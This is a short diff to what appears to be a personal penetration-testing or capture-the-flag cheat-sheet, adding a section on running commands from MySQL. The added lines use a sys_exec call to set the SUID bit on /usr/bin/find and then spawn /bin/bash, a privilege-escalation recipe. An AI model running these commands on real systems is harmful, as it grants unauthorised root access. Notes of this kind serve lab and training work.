@@ -999,6 +999,8 @@ use flag;
 show tables;
 select * from flag;
 
+
+
 =================
 Windows 7 SP1 x64
 =================
@@ -1156,7 +1158,12 @@ try other mysql services
 		sqli
 		mysqldump --databases Magic -u theseus -p
 		etc
-		
+
+Execute malicious commands from mysql
+	mysql -u root -p
+	SELECT sys_exec('chmod u+s /usr/bin/find');
+	echo os.system('/bin/bash')
+	quit		
 =======================
 POWERSHELL Exploitation
 =======================	
